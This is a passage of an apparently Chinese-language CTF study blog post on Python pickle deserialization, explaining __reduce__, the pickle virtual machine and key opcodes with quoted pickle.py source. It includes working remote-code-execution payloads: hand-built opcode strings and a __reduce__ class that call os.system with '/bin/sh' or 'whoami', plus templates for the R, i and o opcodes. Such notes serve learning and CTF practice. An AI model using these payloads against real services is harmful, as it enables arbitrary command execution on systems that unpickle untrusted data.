+<li><strong>函数</strong>: 可以直接理解为只保存了函数的引用，要求在解封时，相应的函数必须能够在当前环境中被找到<ol>
+<li>细节：对象中包含的方法或函数（即类的实例方法、静态方法、类方法等），pickle实际上不会保存这些方法的具体代码。相反，它会保存一个引用，这个引用指向了定义这些方法的类。因此，在反序列化（解封）过程中，pickle假定原来的类定义仍然可用，并且能够通过相同的路径和名称找到它们</li>
+</ol>
+</li>
+<li><strong>类实例</strong>: pickle会保存该实例的状态信息（即实例变量），但不会保存类本身的代码或定义</li>
+<li>并且可封存的函数和类必须在一个模块的最高层级上</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><p>这样一看函数和lambda的路子像是被封死了，这里我们看看可不可以从类下手: <strong>自定义封存&#x2F;解封行为</strong></p>
+<blockquote>
+<ol>
+<li>python中类可以通过提供一个或多个特殊方法来改变<strong>序列化默认行为</strong>，但是都是copy protocol的一部分，具体实现了<code>__reduce__()</code>方法，它提供了一个同一个接口用于检索pickle和复制对象所需的数据</li>
+<li>注意：pickle是在序列化dump()时被调用的，但是在反序列化load()时才触发恶意代码，具体流程看到<strong>pickle进行简单rce那里</strong></li>
+</ol>
+</blockquote>
+<ol>
+<li><code>object.__reduce__()</code><ol>
+<li><strong>参数</strong>: 没有参数</li>
+<li><strong>返回值</strong>: 应该返回一个字符串或者最好是一个元组（返回的对象通常被称为“reduce值”）<ol>
+<li>如果返回一个字符串，则该字符串应被解释为全局变量的名称</li>
+<li>当返回一个元组时，它的长度必须在2到6个元素之间，可选项可以省略，或者可以提供“None”作为其值，这里重点看前两个参数<ol>
+<li>参数1：一个可调用对象，将调用该对象以创建该对象的初始版本</li>
+<li>参数2：可调用对象的参数元组。如果可调用对象不接受任何参数，则必须给出一个空元组</li>
+<li>参数3：可选的，对象的状态，如前所述，它将被传递给对象的__setstate__（）方法。如果对象没有这样的方法，那么该值必须是一个字典，它将被添加到对象的<code>__dict__</code>属性中（其实就是属性值的处理）</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><code>object.__reduce_ex__()</code><ol>
+<li>定义：与 <code>__reduce__()</code> 类似，但它接受一个整数参数 protocol，表示使用的 pickle 协议版本。</li>
+<li>返回值：返回值与 <code>__reduce__()</code> 相同，但可以根据协议版本进行不同的处理。</li>
+<li>优先级：如果类同时实现了 <code>__reduce__()</code> 和 <code>__reduce_ex__()</code>，那么 <code>__reduce_ex__()</code> 会覆盖 <code>__reduce__()</code> 的行为。</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<h2 id="opcode与PVM"><a href="#opcode与PVM" class="headerlink" title="opcode与PVM"></a>opcode与PVM</h2><h3 id="PVM的结构"><a href="#PVM的结构" class="headerlink" title="PVM的结构"></a>PVM的结构</h3><ol>
+<li>PVM就是python虚拟机，用以运行python字节码(Java是JVM)</li>
+<li>由三个部分组成引擎（或者叫指令分析器），栈区、还有一个 Memo （可以称为标签区）<ol>
+<li><img src="/pic/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/pvm_structure.png" alt="结构"></li>
+<li>反序列化开始时，<strong>引擎</strong>从头开始读取流中的操作码和参数，并对其进行解释处理，在这个过程中会<strong>改变栈区和标签区</strong> 直到遇到.这个结束符后停止 处理结束之后会到达栈顶并在栈顶生成反序列化的结果 形成并返回反序列化的对象</li>
+<li><strong>指令处理器</strong>: 从流中读取opcode和参数, 并对其进行解释处理. 重复这个动作, 直到遇到.这个结束符后停止, 最终留在栈顶的值将被作为反序列化对象返回.</li>
+<li><strong>栈区(stack)</strong>: 由Python的list实现, 被用来临时存储数据、参数以及对象, 在不断的进出栈过程中完成对数据流的反序列化操作, 并最终在栈顶生成反序列化的结果.</li>
+<li><strong>标签区(memo)</strong>: 是数据的一个索引(标记)，由Python的dict实现, 为PVM的整个生命周期提供存储.</li>
+</ol>
+</li>
+<li>pvm执行流程<ol>
+<li>首先, PVM会把源代码编译成字节码, 字节码是Python语言特有的一种表现形式, 它不是二进制机器码, 需要进一步编译才能被机器执行. 如果Python进程在主机上有写入权限, 那么它会把程序字节码保存为一个以.pyc为扩展名的文件. 如果没有写入权限, 则Python进程会在内存中生成字节码, 在程序执行结束后被自动丢弃</li>
+<li>一般来说, 在构建程序时最好给Python进程在主机上的写入权限, 这样只要源代码没有改变, 生成的.pyc文件就可以被重复利用, 提高执行效率, 同时隐藏源代码.</li>
+<li>然后, Python进程会把编译好的字节码转发到PVM(Python虚拟机)中, PVM会循环迭代执行字节码指令, 直到所有操作被完成.</li>
+</ol>
+</li>
+</ol>
+<h3 id="从例子理解opcode"><a href="#从例子理解opcode" class="headerlink" title="从例子理解opcode"></a>从例子理解opcode</h3><ol>
+<li><p>pickle中的opcode实际上可以看作一种独立的语言(流)，通过对opcode的编写可以进行Python代码执行、覆盖变量等操作。<strong>直接编写的opcode灵活性比使用pickle序列化生成的代码更高</strong>，并且有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）</p>
+</li>
+<li><p><strong>opcode的书写规范</strong></p>
+<ol>
+<li>操作码是单字节的</li>
+<li>带参数的指令用换行符定界(<code>&quot;\n&quot;</code>)</li>
+</ol>
+</li>
+<li><p>这里先描述一下序列化和反序列化的具体过程</p>
+<ol>
+<li><strong>序列化过程</strong><ol>
+<li>从对象提取所有属性，并将属性转化为名值对</li>
+<li>写入对象的类名</li>
+<li>写入名值对</li>
+</ol>
+</li>
+<li><strong>反序列化过程</strong><ol>
+<li>获取 pickle 输入流</li>
+<li>重建属性列表</li>
+<li>根据类名创建一个新的对象</li>
+<li>将属性复制到新的对象中</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><p>这里手搓一个然后重点讲解一些标记</p>
+<blockquote>
+<p>重点的几个opcode，其他的可以在pickle.py中找到<br>S : 后面跟的是字符串，push string; NL-terminated string argument<br>( ：作为命令执行到哪里的一个标记，push special markobject on stack<br>t ：将从 t 到标记的全部元素组合成一个元祖，然后放入栈中，build tuple from topmost stack items<br>c ：定义模块名和类名（模块名和类名之间使用回车分隔），push self.find_class(modname, name); 2 string args<br>o ：与类对象有关，类的实例（即对象），而不是类本身，build &amp; push class instance<br>R ：从栈中取出可调用函数以及元祖形式的参数来执行，并把结果放回栈中，apply callable to argtuple, both on stack<br>. ：点号是结束符，every pickle ends with STOP</p>
+</blockquote>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># myOpcode.pkl</span></span><br><span class="line">cos         <span class="comment"># c 后面是模块名，换行后是类名,于是将 os.system 放入栈中</span></span><br><span class="line">system</span><br><span class="line">(S<span class="string">&#x27;/bin/sh&#x27;</span> <span class="comment"># ( 这个是标记符，表示元组的开始。它会将当前的栈状态保存到元组栈（metastack）中，并清空当前栈，S 后面是字符串，将 &#x27;/bin/sh&#x27; 压入 stack.</span></span><br><span class="line">tR.         <span class="comment"># t 将 stack 中的值(mark之前的内容即栈前面部分的内容)弹出并转为 tuple, 把 metastack 还原到 stack, 再将 tuple (&#x27;/bin/sh&#x27;,) 压入 stack，同时标记 Mark 消失 </span></span><br><span class="line">            <span class="comment"># R 将元祖取出，并将 callable 取出，然后将元祖作为 callable 的参数，并执行，对应这里就是 os.system(‘/bin/sh’),然后将结果再存入栈中</span></span><br><span class="line">            <span class="comment"># . 结束并返回当前栈顶元素.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># myOpcodeTest.py</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/home/kc1zs4/Code/CTF/Learned/PyPickle/myOpcode.pkl&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = pickle.load(file)</span><br><span class="line">    <span class="comment"># 成功执行命令</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="进阶：pickle源码中的opcode"><a href="#进阶：pickle源码中的opcode" class="headerlink" title="进阶：pickle源码中的opcode"></a>进阶：pickle源码中的opcode</h3><blockquote>
+<p>查看运作原理可以根据pickle.py中各个opcode的名称查找对应的<code>load_[opcode_name]</code>来查看处理的初步逻辑</p>
+</blockquote>
+<ol>
+<li><p>index</p>
+<ol>
+<li>(: 存入metastack，清空当前栈</li>
+<li>R: 调用当前栈顶两个元素执行回调</li>
+<li>i</li>
+<li>o</li>
+<li>c</li>
+<li>b</li>
+<li>t</li>
+</ol>
+</li>
+<li><p>先总结一下自我的理解</p>
+<ol>
+<li><strong>利用点</strong>: 这里实际上相当于一步一步的命令操作，每一个opcode后对应一个函数操作，有些opcode中包含了可控的回调输入，这就是我们的一个利用点</li>
+<li><strong>过滤</strong>：需要注意到，再序列化字符串中我们的信息是没有进行编码的，opcode只是对应的操作，所以对于黑名单是可以进行过滤的</li>
+<li><strong>运行机制</strong><ol>
+<li>底层实现为一个栈和一个元栈，元栈中保存的是上一片段的信息，栈保存的是这一片段的信息，可以共同实现对数据的切分安排，关键的操作在于stack.append()和metastack.pop()这里，支持嵌套<ol>
+<li><code>i</code>, <code>t</code>有metastack.pop()操作，都粉装再pop_mark()里，故名思意</li>
+<li>pop_mark返回当前栈，并将metastack复原为stack，也就是说当前stack被覆盖了</li>
+</ol>
+</li>
+<li>主要是<strong>对象-参数-调用</strong>驱动，比如o或i或c生成对象，然后使用R或i或者o进行调用，有些是一个操作符做几件事的</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><p><code>load_mark(self)</code>对应<code>&#39;(&#39;</code></p>
+<ol>
+<li>元组开始：( 操作码将当前栈的状态保存到元组栈（metastack）中，并清空当前栈。</li>
+<li>元组结束：当遇到相应的元组结束操作码（通常是 t 或 )）时，会将当前栈中的所有元素组成一个元组，并将其压入栈中。</li>
+</ol>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_mark</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="variable language_">self</span>.metastack.append(<span class="variable language_">self</span>.stack)</span><br><span class="line">    <span class="variable language_">self</span>.stack = []</span><br><span class="line">    <span class="variable language_">self</span>.append = <span class="variable language_">self</span>.stack.append</span><br><span class="line">dispatch[MARK[<span class="number">0</span>]] = load_mark</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>load_reduce</code>对应<code>&#39;R&#39;</code></p>
+<ol>
+<li>可以看到pop()处栈顶元素(也就是一开始最后一个元素，-1对应的)，并将其作为回调函数的参数，回调函数是栈顶倒数第二个元素</li>
+<li>并将调用的结果放到栈顶</li>
+</ol>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_reduce</span>(<span class="params">self</span>):</span><br><span class="line">    stack = <span class="variable language_">self</span>.stack</span><br><span class="line">    args = stack.pop()</span><br><span class="line">    func = stack[-<span class="number">1</span>]</span><br><span class="line">    stack[-<span class="number">1</span>] = func(*args)</span><br><span class="line">dispatch[REDUCE[<span class="number">0</span>]] = load_reduce</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>load_inst(self)</code>对应<code>i</code></p>
+<ol>
+<li>两行作为module和name，并调用了<code>_instantiate(..)</code>方法通过</li>
+<li><code>_instantiate(..)</code>用于获取一个实例，并会处理对应的参，这里的参数是当前stack的内容</li>
+</ol>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">INST           = <span class="string">b&#x27;i&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_inst</span>(<span class="params">self</span>):</span><br><span class="line">    module = <span class="variable language_">self</span>.readline()[:-<span class="number">1</span>].decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    name = <span class="variable language_">self</span>.readline()[:-<span class="number">1</span>].decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    klass = <span class="variable language_">self</span>.find_class(module, name)</span><br><span class="line">    <span class="variable language_">self</span>._instantiate(klass, <span class="variable language_">self</span>.pop_mark())</span><br><span class="line">dispatch[INST[<span class="number">0</span>]] = load_inst</span><br><span class="line"></span><br><span class="line"><span class="comment"># Return a list of items pushed in the stack after last MARK instruction.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop_mark</span>(<span class="params">self</span>):</span><br><span class="line">    items = <span class="variable language_">self</span>.stack</span><br><span class="line">    <span class="variable language_">self</span>.stack = <span class="variable language_">self</span>.metastack.pop()</span><br><span class="line">    <span class="variable language_">self</span>.append = <span class="variable language_">self</span>.stack.append</span><br><span class="line">    <span class="keyword">return</span> items</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>load_obj(self)</code>对应<code>&#39;o&#39;</code></p>
+<ol>
+<li>获取当前stack的东西(pop_mark返回)，其中获取的类cls也在stack中</li>
+</ol>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">OBJ            = <span class="string">b&#x27;o&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_obj</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="comment"># Stack is ... markobject classobject arg1 arg2 ...</span></span><br><span class="line">    args = <span class="variable language_">self</span>.pop_mark()</span><br><span class="line">    cls = args.pop(<span class="number">0</span>)</span><br><span class="line">    <span class="variable language_">self</span>._instantiate(cls, args)</span><br><span class="line">dispatch[OBJ[<span class="number">0</span>]] = load_obj</span><br><span class="line"></span><br><span class="line"><span class="string">b&quot;(cos\nsystem\nS&#x27;/bin/sh&#x27;\no.&quot;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>load_global(self)</code>对应<code>&#39;c&#39;</code></p>
+<ol>
+<li>会根据模块和name找到对应的cls对象，然后压入栈中</li>
+</ol>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_global</span>(<span class="params">self</span>):</span><br><span class="line">    module = <span class="variable language_">self</span>.readline()[:-<span class="number">1</span>].decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    name = <span class="variable language_">self</span>.readline()[:-<span class="number">1</span>].decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    klass = <span class="variable language_">self</span>.find_class(module, name)</span><br><span class="line">    <span class="variable language_">self</span>.append(klass)</span><br><span class="line">dispatch[GLOBAL[<span class="number">0</span>]] = load_global</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>load_build</code>对应<code>&#39;b&#39;</code></p>
+<ol>
+<li>一眼原型链污染(大雾</li>
+<li>这里会对有<code>__setstate__</code>的对象进行调用，这是属性 -&gt; 这里我们如果自己写一个<code>__setstate__​</code>类 构造os.system 和 whoami即可<strong>执行命令</strong></li>
+</ol>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">BUILD          = <span class="string">b&#x27;b&#x27;</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_build</span>(<span class="params">self</span>):</span><br><span class="line">    stack = <span class="variable language_">self</span>.stack</span><br><span class="line">    state = stack.pop()</span><br><span class="line">    inst = stack[-<span class="number">1</span>]</span><br><span class="line">    setstate = <span class="built_in">getattr</span>(inst, <span class="string">&quot;__setstate__&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> setstate <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        setstate(state)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    slotstate = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(state, <span class="built_in">tuple</span>) <span class="keyword">and</span> <span class="built_in">len</span>(state) == <span class="number">2</span>:</span><br><span class="line">        state, slotstate = state</span><br><span class="line">    <span class="keyword">if</span> state:</span><br><span class="line">        inst_dict = inst.__dict__</span><br><span class="line">        intern = sys.intern</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> state.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">type</span>(k) <span class="keyword">is</span> <span class="built_in">str</span>:</span><br><span class="line">                inst_dict[intern(k)] = v</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                inst_dict[k] = v</span><br><span class="line">    <span class="keyword">if</span> slotstate:</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> slotstate.items():</span><br><span class="line">            <span class="built_in">setattr</span>(inst, k, v)</span><br><span class="line">dispatch[BUILD[<span class="number">0</span>]] = load_build</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>load_setitem(self)</code>对应<code>&#39;s&#39;</code></p>
+<ol>
+<li>再栈中获取顶上两个作为值键并添加到最后栈顶的的dict中，其实算是修改栈顶了</li>
+</ol>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SETITEM        = <span class="string">b&#x27;s&#x27;</span>   <span class="comment"># add key+value pair to dict</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_setitem</span>(<span class="params">self</span>):</span><br><span class="line">    stack = <span class="variable language_">self</span>.stack</span><br><span class="line">    value = stack.pop()</span><br><span class="line">    key = stack.pop()</span><br><span class="line">    <span class="built_in">dict</span> = stack[-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">dict</span>[key] = value</span><br><span class="line">dispatch[SETITEM[<span class="number">0</span>]] = load_setitem</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>load_tuple</code>对应<code>&#39;t&#39;</code></p>
+<ol>
+<li>读取stack中的内容，合成一个tuple后加入到stack中</li>
+<li><code>pop_mark()</code>中会将metastack也给pop()，会得到上一个(存储的stack内容，可以理解为恢复栈 –&gt; 提供了嵌套(的可行性</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">TUPLE          = <span class="string">b&#x27;t&#x27;</span>   <span class="comment"># build tuple from topmost stack items</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_tuple</span>(<span class="params">self</span>):</span><br><span class="line">    items = <span class="variable language_">self</span>.pop_mark()</span><br><span class="line">    <span class="variable language_">self</span>.append(<span class="built_in">tuple</span>(items))</span><br><span class="line">dispatch[TUPLE[<span class="number">0</span>]] = load_tuple</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="pickle进行简单RCE"><a href="#pickle进行简单RCE" class="headerlink" title="pickle进行简单RCE"></a>pickle进行简单RCE</h2><h3 id="利用-reduce"><a href="#利用-reduce" class="headerlink" title="利用__reduce__"></a>利用<code>__reduce__</code></h3><blockquote>
+<p>看网上别人的文章时发现他错把<code>__reduce__()</code>看作php里的<code>__wakeup()</code>了，这里来好好讲一下流程</p>
+</blockquote>
+<ol>
+<li><p>也是给一个基本payload，在进行序列化pickling时被调用封存数据，并在最后<code>object.load()</code>时触发恶意代码</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        shell = <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(shell,))</span><br><span class="line"></span><br><span class="line">demo = Demo()</span><br><span class="line">pickle.loads(pickle.dumps(demo))</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>具体流程</p>
+<ol>
+<li>序列化dump()<ol>
+<li>pickle.dumps(obj) 调用 MyClass 实例的 <code>__reduce__()</code> 方法。</li>
+<li><code>__reduce__()</code> 返回 <code>(self.__class__, (self.value,), self.__dict__)</code>。</li>
+<li>pickle 使用这个元组来生成封存的数据流，这里进行了封装，和直接手写opcode不一样啊</li>
+</ol>
+</li>
+<li>反序列化load()<ol>
+<li>pickle.loads(serialized) 读取封存的数据流。</li>
+<li>pickle 使用封存数据中的信息来重建 MyClass 实例。</li>
+<li>在重建对象后，pickle 调用 <code>__setstate__()</code> 方法，并将 <code>__reduce__()</code> 返回的状态传递给它。</li>
+<li><code>__setstate__()</code> 方法通过 <code>self.__dict__.update(state)</code> 将状态恢复到对象的属性中。</li>
+</ol>
+</li>
+</ol>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># # # 流程验证 # # #</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="comment"># def __reduce__(self):</span></span><br><span class="line">        <span class="comment"># shell = &#x27;/bin/sh&#x27;</span></span><br><span class="line">        <span class="comment"># return (os.system,(shell,))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># demo = Demo()</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/home/kc1zs4/Code/CTF/Learned/PyPickle/reducePayload_1.pkl&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># pickle.dump(demo,f,protocol=0)</span></span><br><span class="line">    pickle.load(f)</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="手搓opcode"><a href="#手搓opcode" class="headerlink" title="手搓opcode"></a>手搓opcode</h3><blockquote>
+<p>建议先看完《进阶：pickle源码中的opcode》并了解关键opcode的用法后再来</p>
+</blockquote>
+<ol>
+<li><strong>思想</strong>: 其实也可以将opcode的拼凑作为<strong>调用链</strong>来看，这里其实糅合了很多东西</li>
+</ol>
+<h4 id="pickletools分析方法"><a href="#pickletools分析方法" class="headerlink" title="pickletools分析方法"></a>pickletools分析方法</h4><blockquote>
+<p>多分析几条构造的后面就会自己写了</p>
+</blockquote>
+<ol>
+<li>实例脚本<ol>
+<li>注意换行和空格要严格遵守</li>
+</ol>
+</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line">opcode=<span class="string">&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pickletools.dis(opcode.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<h4 id="R操作符"><a href="#R操作符" class="headerlink" title="R操作符"></a>R操作符</h4><blockquote>
+<p>利用条件：无过滤下可输入即可利用</p>
+</blockquote>
+<ol>
+<li><p>给个模板，一般题目直接这样就好了，详细内容看从例子理解opcode</p>
+<ol>
+<li>就是<code>__import__(&#39;os&#39;).system(*(&#39;whoami&#39;,))</code></li>
+</ol>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c&lt;module&gt;</span><br><span class="line">&lt;<span class="built_in">callable</span>&gt;</span><br><span class="line">(&lt;args&gt;</span><br><span class="line">tR.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一般脚本</span></span><br><span class="line">cos</span><br><span class="line">system</span><br><span class="line">(S<span class="string">&#x27;/bin/bash&#x27;</span></span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>最终payload: <code>&quot;cos\nsystem\n(S&#39;/bin/sh&#39;\ntR.)&quot;</code></p>
+</li>
+<li><p>R的作用</p>
+</li>
+</ol>
+<h4 id="i操作符"><a href="#i操作符" class="headerlink" title="i操作符"></a>i操作符</h4><ol>
+<li>结合上述进阶内容，直接写payload: <code>(X\x06\x00\x00\x00whoamiios\nsystem\n.</code></li>
+<li>这里需要说明一下<ol>
+<li><p>回去看i的源码，可以看到i中有调用到pop_mark()，其实这里不需要t的原因就是因为这里的i调用了pop_mark()，R中的调用也在再i中进行了</p>
+</li>
+<li><p><code>load_binunicode</code>对应<code>&#39;X&#39;</code></p>
+<ol>
+<li>这里其实不用过多看源码，<strong>把它当作S理解就好</strong>，只是要多点格式：要先写出数据的长度，\x05\x00\x00\x00 是字符串”hello”的长度（5个字节）</li>
+</ol>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_binunicode</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="built_in">len</span>, = unpack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="variable language_">self</span>.read(<span class="number">4</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span> &gt; maxsize:</span><br><span class="line">        <span class="keyword">raise</span> UnpicklingError(<span class="string">&quot;BINUNICODE exceeds system&#x27;s maximum size &quot;</span></span><br><span class="line">                              <span class="string">&quot;of %d bytes&quot;</span> % maxsize)</span><br><span class="line">    <span class="variable language_">self</span>.append(<span class="built_in">str</span>(<span class="variable language_">self</span>.read(<span class="built_in">len</span>), <span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;surrogatepass&#x27;</span>))</span><br><span class="line">dispatch[BINUNICODE[<span class="number">0</span>]] = load_binunicode</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+<h4 id="o操作符"><a href="#o操作符" class="headerlink" title="o操作符"></a>o操作符</h4><ol>
+<li>也是直接上payload: <code>b&quot;(cos\nsystem\nS&#39;/bin/sh&#39;\no.&quot;</code></li>
+<li>这里的核心也是pop_mark()，再o中会有它的身影，S部分也可以换成X这样</li>
+</ol>
